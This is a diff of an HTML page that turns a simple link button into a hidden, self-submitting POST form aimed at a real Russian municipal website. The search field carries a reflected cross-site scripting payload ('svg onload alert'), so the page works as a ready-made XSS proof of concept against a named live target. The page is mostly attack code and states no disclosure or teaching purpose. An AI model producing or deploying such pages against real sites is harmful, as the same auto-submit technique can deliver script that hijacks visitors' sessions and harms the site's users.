@@ -1,16 +1,22 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="ru">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Click here</title>
+    <title>Отправка POST-запроса</title>
 </head>
 <body>
-    <button id="openLinkButton">Open Link in New Tab</button>
-
+    <form id="autoSubmitForm" action="https://gz.admtyumen.ru/cms/chapter.do?chapterId=4" method="post">
+        <input type="hidden" name="newsSearchData.defaultSearch" value="false">
+        <input type="hidden" name="useCache" value="false">
+        <input type="hidden" name="newsSearchData.searchText" value="&quot;><svg/onload=alert(123)>">
+        <input type="hidden" name="newsSearchData.from" value="">
+        <input type="hidden" name="newsSearchData.till" value="">
+        <button type="submit">Отправить</button>
+    </form>
     <script>
-        document.getElementById('openLinkButton').addEventListener('click', function() {
-            window.open('https://lp.ozon.ru/api/webinar-api/client/v1/stream/subscribe?streamId=2858', '_blank');
+        document.addEventListener("DOMContentLoaded", function() {
+            document.getElementById("autoSubmitForm").submit();
         });
     </script>
 </body>
